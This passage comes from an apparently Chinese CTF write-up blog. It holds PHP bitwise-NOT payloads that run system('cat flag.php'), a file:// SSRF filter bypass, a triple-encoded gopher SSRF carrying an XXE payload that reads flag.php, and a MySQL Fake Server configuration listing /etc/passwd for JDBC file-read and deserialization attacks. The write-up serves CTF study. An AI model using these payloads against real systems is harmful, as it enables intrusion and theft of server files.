class="variable">$d</span>=<span class="string">&quot;readfile&quot;</span>;</span><br><span class="line"><span class="variable">$f</span>=<span class="string">&quot;.&quot;</span>;</span><br><span class="line"><span class="variable">$g</span>=<span class="string">&quot;flag.php&quot;</span></span><br><span class="line"><span class="variable">$h</span>=<span class="string">&quot;system&quot;</span>;</span><br><span class="line"><span class="variable">$i</span>=<span class="string">&quot;cat flag.php&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;过滤探测:&quot;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(~<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;===============&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;方法一:&quot;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(~<span class="variable">$b</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(~<span class="variable">$c</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(~<span class="variable">$d</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(~<span class="variable">$e</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(~<span class="variable">$f</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(~<span class="variable">$g</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;===============&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;方法二:&quot;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(~<span class="variable">$h</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(~<span class="variable">$i</span>);</span><br><span class="line"></span><br><span class="line">payload:</span><br><span class="line">?code=(<span class="keyword">echo</span>输出的内容)(<span class="keyword">echo</span>输出的内容)</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="do-you-know"><a href="#do-you-know" class="headerlink" title="do you know"></a>do you know</h2><h3 id="源码审计"><a href="#源码审计" class="headerlink" title="源码审计"></a>源码审计</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$poc</span>=<span class="variable">$_SERVER</span>[‘QUERY_STRING‘];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/log|flag|hist|dict|etc|file|write/i&quot;</span> ,<span class="variable">$poc</span>))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;no hacker&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"><span class="variable">$ids</span>=<span class="title function_ invoke__">explode</span>(‘&amp;‘,<span class="variable">$poc</span>);</span><br><span class="line"><span class="variable">$a_key</span>=<span class="title function_ invoke__">explode</span>(‘=‘,<span class="variable">$ids</span>[<span class="number">0</span>])[<span class="number">0</span>];</span><br><span class="line"><span class="variable">$b_key</span>=<span class="title function_ invoke__">explode</span>(‘=‘,<span class="variable">$ids</span>[<span class="number">1</span>])[<span class="number">0</span>];</span><br><span class="line"><span class="variable">$a_value</span>=<span class="title function_ invoke__">explode</span>(‘=‘,<span class="variable">$ids</span>[<span class="number">0</span>])[<span class="number">1</span>];</span><br><span class="line"><span class="variable">$b_value</span>=<span class="title function_ invoke__">explode</span>(‘=‘,<span class="variable">$ids</span>[<span class="number">1</span>])[<span class="number">1</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$a_key</span>||!<span class="variable">$b_key</span>||!<span class="variable">$a_value</span>||!<span class="variable">$b_value</span>)</span><br><span class="line">&#123;</span><br><span class="line">        <span class="keyword">die</span>(‘我什么都没有~‘);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$a_key</span>==<span class="variable">$b_key</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;trick&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$a_value</span>!==<span class="variable">$b_value</span>)</span><br><span class="line">&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">count</span>(<span class="variable">$_GET</span>)!=<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="keyword">die</span>(‘be it so‘);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$value</span>)</span><br><span class="line">&#123;</span><br><span class="line">        <span class="variable">$url</span>=<span class="variable">$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$type</span> != ‘file‘) &#123;</span><br><span class="line">        <span class="comment">#add_debug_log($param, ‘post_data‘);</span></span><br><span class="line">        <span class="comment">// 设置超时</span></span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_TIMEOUT, <span class="number">30</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 设置超时</span></span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_TIMEOUT, <span class="number">180</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_POST, <span class="literal">true</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_SSL_VERIFYPEER, <span class="literal">false</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_SSL_VERIFYHOST, <span class="literal">false</span>);</span><br><span class="line">   <span class="comment">// 设置header</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$type</span> == ‘file‘) &#123;</span><br><span class="line">        <span class="variable">$header</span>[] = <span class="string">&quot;content-type: multipart/form-data; charset=UTF-8&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HTTPHEADER, <span class="variable">$header</span>);</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (<span class="variable">$type</span> == ‘xml‘) &#123;</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="literal">false</span>);</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (<span class="variable">$has_json</span>) &#123;</span><br><span class="line">        <span class="variable">$header</span>[] = <span class="string">&quot;content-type: application/json; charset=UTF-8&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HTTPHEADER, <span class="variable">$header</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// curl_setopt($ch, CURLOPT_USERAGENT, ‘Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)‘);</span></span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_FOLLOWLOCATION, <span class="number">1</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_AUTOREFERER, <span class="number">1</span>);</span><br><span class="line">    <span class="comment">// dump($param);</span></span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_POSTFIELDS, <span class="variable">$param</span>);</span><br><span class="line">    <span class="comment">// 要求结果为字符串且输出到屏幕上</span></span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="literal">true</span>);</span><br><span class="line">    <span class="comment">// 使用证书：cert 与 key 分别属于两个.pem文件</span></span><br><span class="line">    <span class="variable">$res</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="variable">$res</span>);</span><br></pre></td></tr></table></figure><ul><li>首先$poc变量是接收了我们的传参</li><li>然后经过一个匹配，如果没有黑名单就放过，否则直接ban掉</li><li>然后$ids是将我们从‘&amp;‘分隔开 $a_key 是取我们前面的那个变量的键名</li><li>$b_key 是取后面变量的键名</li><li>$a_value 是取前面变量的键值</li><li>$b_value 是取后面的键值</li><li>接着一个if的判断是的我们必须拥有以上的四种变量</li><li>也就是说我们的传参必须为&#x2F;?s1mple&#x3D;xxxxxxx&amp;simple&#x3D;xxxx</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$a_key</span>==<span class="variable">$b_key</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;trick&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>一个判断让我们两个键名不可以相同；</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$a_value</span>!==<span class="variable">$b_value</span>)</span><br><span class="line">&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">count</span>(<span class="variable">$_GET</span>)!=<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="keyword">die</span>(‘be it so‘);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>这里如果一旦不满足两个值不相等，那么就会进入下一个判断，就会判断我们传参的个数，显然我们之前分析过，传入的参数是两个，所以这里必死无疑，所以唯一的方法就是让我们的两个键值相等；就可以绕过去；</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$value</span>)</span><br><span class="line">&#123;</span><br><span class="line">        <span class="variable">$url</span>=<span class="variable">$value</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>接着遍历我们的键名键值</li><li>然后将url赋值为我们传入的键值</li><li>然后接着就是启动一个会话进行我们的ssrf攻击了</li><li>这里出题人提示的很明确，无关的代码都标出了它的含义。</li><li>那些代码都是我们不需要关心的，都是服务器的执行流程；</li><li>这里显然在会话的开始就提示了我们使用file协议；</li><li>但是我们源码刚开始的一个匹配过滤了file协议，现在就是怎么绕过的问题；</li></ul><blockquote><p>这里需要明白我们浏览器和服务器处理数据的流程，我们传入的参数会经过浏览器的urlencode然后传给服务器，我们服务器收到之后会先进行urldecode，然后拿去正则判断，如果过去之后，则交由后续的程序处理</p></blockquote><h3 id="非预期分析-SSRF"><a href="#非预期分析-SSRF" class="headerlink" title="非预期分析(SSRF)"></a>非预期分析(SSRF)</h3><p>利用<code>file协议</code>读取&#96;&#96;flag.php&#96;文件</p><p>源码中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$poc</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>];  </span><br></pre></td></tr></table></figure><p>因为它不会对url解码，所以直接绕过过滤，利用file协议去读文件</p><p>payload:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?xxx=file:///var/www/html/flag.php&amp;yyy=file:///var/www/html/flag.php</span><br></pre></td></tr></table></figure><p>urlpayload:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?xxx=%66%69%6c%65%3a%2f%2f%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%66%6c%61%67%2e%70%68%70&amp;yyy=%66%69%6c%65%3a%2f%2f%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%66%6c%61%67%2e%70%68%70</span><br></pre></td></tr></table></figure><blockquote><p>这里看到我们服务器处理完之后得到的结果就是后面的结果，前面过正则的时候，我们的file协议什么的都是经过urlencode的，可以顺利绕过去，然后交由我们服务器的程序进行解析，看到是urlencode会进行再次的解码，然后处理得到结果，从而去读取我们的&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php文件</p></blockquote><h3 id="预期分析-SSRF和XXE"><a href="#预期分析-SSRF和XXE" class="headerlink" title="预期分析(SSRF和XXE)"></a>预期分析(SSRF和XXE)</h3><p>用<code>gopher</code>进行<code>ssrf</code>发送<code>post</code>请求给<code>xxe.php</code></p><p><strong>根据payload分析</strong></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?a=1&amp;b=1&amp;c=gopher://127.0.0.1:80/_POST%2520/xxe.php%2520HTTP/1.1%250d%250aHost%3a127.0.0.1%3a80%250d%250aAccept%3a*/*%250d%250aContent-Length%3a611%250d%250aContent-Type%3aapplication/x-www-form-urlencoded%250d%250a%250d%250adata=%25253c%25253f%252578%25256d%25256c%252520%252576%252565%252572%252573%252569%25256f%25256e%25253d%252522%252531%25252e%252530%252522%252520%252565%25256e%252563%25256f%252564%252569%25256e%252567%25253d%252522%252575%252572%252565%252561%252564%252574%252566%25252d%252538%252522%25253f%25253e%25250a%25253c%252521%252544%25254f%252543%252554%252559%252550%252545%252520%252578%252565%252520%25255b%25250a%25253c%252521%252545%25254c%252545%25254d%252545%25254e%252554%252520%25256e%252561%25256d%252565%252520%252541%25254e%252559%252520%25253e%25250a%25253c%252521%252545%25254e%252554%252549%252554%252559%252520%252578%252565%252520%252553%252559%252553%252554%252545%25254d%252520%252522%252570%252568%252570%25253a%25252f%25252f%252566%252569%25256c%252574%252565%252572%25252f%252572%252565%252572%252565%252561%252564%252561%252564%25253d%252563%25256f%25256e%252576%252565%252572%252574%25252e%252562%252561%252573%252565%252536%252534%25252d%252565%25256e%252563%25256f%252564%252565%25252f%252572%252565%252573%25256f%252575%252572%252563%252565%25253d%252566%25256c%252572%252565%252561%252564%252561%252567%25252e%252570%252568%252570%252522%252520%25253e%25255d%25253e%25250a%25253c%252572%25256f%25256f%252574%25253e%25250a%25253c%25256e%252561%25256d%252565%25253e%252526%252578%252565%25253b%25253c%25252f%25256e%252561%25256d%252565%25253e%25250a%25253c%25252f%252572%25256f%25256f%252574%25253e</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>注意必须包括端口，否则<code>gopher</code>访问不到</p></blockquote><p><strong>前一部分分析</strong></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://127.0.0.1:80/_POST%2520/xxe.php%2520HTTP/1.1%250d%250aHost%3a127.0.0.1%3a80%250d%250aAccept%3a*/*%250d%250aContent-Length%3a611%250d%250aContent-Type%3aapplication/x-www-form-urlencoded</span><br></pre></td></tr></table></figure><p>由于<code>gopher</code>协议传递数据包的时候会将第一个字符吞掉，所以我们在前面加一个<code>_</code>，然后后面接数据包,数据包的格式如下:</p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200628183614112.png" alt="image-20200628183614112"></p><p>即为:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/xee.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line">HOST:127.0.0.1:80</span><br><span class="line">Accept:*/*</span><br><span class="line">Content-Length:611</span><br><span class="line">Content-Type:application/x-www-form-urlencoded</span><br></pre></td></tr></table></figure><p>换行的url编码<code>%0d%0a</code>,而且这儿需要将<code>%</code>进行二次编码</p><p>换行位于每两个请求头的中间</p><h3 id="content-length详解"><a href="#content-length详解" class="headerlink" title="content-length详解"></a>content-length详解</h3><p><code>Content-Length:611</code>表示发送数据的大小<br>例如我们POST data&#x3D;xxx，则Content-Length为8，无论你进行多少次url编码，都会将我们发送的数据解码成data&#x3D;xxx，所以有时候我们进行多次url编码，但是服务器还是能识别，这就是Content-Length的作用</p><p>我们知道这道题目实际就是gopher进行xxe攻击，我们只需要用gopher发送一个能读取文件的xml过去就可以了，而且实际题目有一些过滤，双写绕过就行了，能读文件的xml如下</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;ureadtf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">xe</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">name</span> <span class="keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">xe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;php://filter/rereadad=convert.base64-encode/resource=flreadag.php&quot;</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;xe;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>需要注意</strong></p><p>我们在计算长度的时候不能直接计算明文的长度，这是因为上面的字符有一些特殊字符，而这些特殊字符又有实际的含义，例如<code>&amp;</code><br>假设我们只计算明文的长度，则不管我们怎么url编码，服务器都会解析成明文的格式<br>即访问xxe.php是发送的数据为<code>data=&lt;?xml version=&quot;1.0&quot; enco....</code>这样就会包含特殊符号，就不能正确传输数据</p><p><strong>正确的做法</strong></p><ul><li>对payload（即xml）所以字符进行url编码，计算编码后的长度，例上面的xml编码后长度为606，加上data&#x3D;，总长度为610</li><li>先把编码后的数据加在data&#x3D;的后面</li><li>直接在burpsuite里面编码（只对特殊字符编码即可，即%，因为GET方法有长度限制，如果编码太长不能发送请求）（再编两次码，总共对xml三次编码，因为我们发送请求时浏览器本身会编一次码，然后gopher发送数据时也会编码一次，所以只有编码三次，到达xxe.php的数据才是xml第一次编码之后的数据，否则直接是明文数据，不能有效传递xml，如果编码四次也不行，只能三次，这只是针对特殊字符的）</li><li>burpsuite对特殊字符编码的地方</li></ul><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200628195203995.png" alt="image-20200628195203995"></p><p><strong>结果</strong></p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200628195254261.png" alt="image-20200628195254261"></p><p>对结果进行<code>base64</code>解码即可</p><h2 id="zzm’s-blog"><a href="#zzm’s-blog" class="headerlink" title="zzm’s blog"></a>zzm’s blog</h2><h3 id="xml文件"><a href="#xml文件" class="headerlink" title="xml文件"></a>xml文件</h3><p>首先贴出xml文件，查看依赖:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.sparkjava<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spark-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.9.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.slf4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>slf4j-nop<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.7.30<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>8.0.15<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-databind<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.9.8<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.9.8<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-annotations<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.9.8<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><p>使用github,找到工具<a href="https://github.com/fnmsd/MySQL_Fake_Server#mysql-fake-server">MySQL Fake Server</a></p><p><strong>用途</strong></p><ol><li>MySQL服务端读取客户端文件漏洞利用</li><li>MySQL JDBC客户端Java反序列化漏洞利用</li></ol><h3 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h3><p>修改config.json</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;fileread&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;win_ini&quot;</span><span class="punctuation">:</span><span class="string">&quot;c:\\windows\\win.ini&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;win_hosts&quot;</span><span class="punctuation">:</span><span class="string">&quot;c:\\windows\\system32\\drivers\\etc\\hosts&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;win&quot;</span><span class="punctuation">:</span><span class="string">&quot;c:\\windows\\&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;linux_passwd&quot;</span><span class="punctuation">:</span><span class="string">&quot;/etc/passwd&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;linux_hosts&quot;</span><span class="punctuation">:</span><span class="string">&quot;/etc/hosts&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;index_php&quot;</span><span 